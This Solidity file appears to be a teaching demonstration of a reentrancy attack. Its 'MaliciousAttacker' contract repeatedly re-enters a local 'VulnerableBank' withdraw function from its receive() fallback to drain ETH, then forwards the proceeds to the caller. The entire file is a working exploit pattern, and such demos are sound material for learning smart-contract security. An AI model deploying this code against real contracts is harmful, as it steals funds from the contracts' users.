// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./VulnerableBank.sol";

contract MaliciousAttacker {
    VulnerableBank public bank;
    uint256 public callCount = 0;
    uint256 public constant MAX_CALLS = 10; // Limit recursive calls to avoid running out of gas

    constructor(address payable _bankAddress) {
        bank = VulnerableBank(_bankAddress);
    }

    // 攻击入口：存 1 ETH，然后疯狂提现
    function attack() external payable {
        require(msg.value >= 1 wei, "Must send some ETH");
        // Deposit 1 wei to have a balance in the bank
        (bool success, ) = address(bank).call{value: msg.value}("");
        require(success, "Deposit failed");
        // Call withdraw to trigger the reentrancy
        bank.withdraw(msg.value); // Withdraw the amount sent
    }

    // ⚡ 关键！当收到 ETH 时自动重入
    receive() external payable {
        // Limit the number of recursive calls to avoid running out of gas
        if (address(bank).balance >= 1 ether && callCount < MAX_CALLS) {
            callCount++;
            // Attempt to withdraw 1 ETH from the bank
            bank.withdraw(1 ether);
        }
    }

    // 提现到安全钱包
    function withdrawAll() external {
        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
        require(sent, "Withdraw failed");
    }
    
    function getCallCount() external view returns (uint256) {
        return callCount;
    }
}